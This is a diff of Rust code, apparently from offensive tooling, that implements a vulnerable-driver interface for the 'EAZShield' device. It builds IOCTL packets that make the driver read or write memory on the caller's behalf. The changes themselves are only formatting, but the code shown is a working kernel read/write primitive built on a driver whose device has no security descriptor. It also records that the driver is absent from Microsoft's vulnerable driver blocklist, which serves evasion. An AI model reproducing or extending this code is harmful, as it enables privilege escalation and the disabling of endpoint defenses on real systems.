@@ -58,17 +58,30 @@ impl VulnDriverIoctl for Shield {
     fn device_path(&self) -> &[u16] {
         // \\.\EAZShield — device created by the driver with no security descriptor.
         static PATH: [u16; 13] = [
-            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
-            'E' as u16, 'A' as u16, 'Z' as u16, 'S' as u16,
-            'h' as u16, 'i' as u16, 'e' as u16, 'l' as u16,
+            '\\' as u16,
+            '\\' as u16,
+            '.' as u16,
+            '\\' as u16,
+            'E' as u16,
+            'A' as u16,
+            'Z' as u16,
+            'S' as u16,
+            'h' as u16,
+            'i' as u16,
+            'e' as u16,
+            'l' as u16,
             'd' as u16,
         ];
         &PATH
     }
 
     // Same IOCTL for both directions (direction byte in the request selects).
-    fn read_ioctl(&self) -> u32 { SHIELD_IOCTL }
-    fn write_ioctl(&self) -> u32 { SHIELD_IOCTL }
+    fn read_ioctl(&self) -> u32 {
+        SHIELD_IOCTL
+    }
+    fn write_ioctl(&self) -> u32 {
+        SHIELD_IOCTL
+    }
 
     fn blocklist_status(&self) -> &'static str {
         "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of July 2026 (LOLDrivers #344)"
@@ -90,7 +103,9 @@ impl VulnDriverIoctl for Shield {
         device: *mut c_void,
         dioctl: DeviceIoControlFn,
     ) -> Result<(), usize> {
-        let total = SHIELD_HEADER_LEN.checked_add(buf.len()).expect("shield buf overflow");
+        let total = SHIELD_HEADER_LEN
+            .checked_add(buf.len())
+            .expect("shield buf overflow");
         let mut packet: alloc::vec::Vec<u8> = alloc::vec![0u8; total];
 
         // Header (see struct doc above).
@@ -108,8 +123,7 @@ impl VulnDriverIoctl for Shield {
         // header. For a read the payload region is the output landing pad; it
         // is left zeroed here and filled by the driver.
         if matches!(op, RwOp::Write) {
-            packet[SHIELD_HEADER_LEN..SHIELD_HEADER_LEN + buf.len()]
-                .copy_from_slice(buf);
+            packet[SHIELD_HEADER_LEN..SHIELD_HEADER_LEN + buf.len()].copy_from_slice(buf);
         }
 
         let mut ret: u32 = 0;
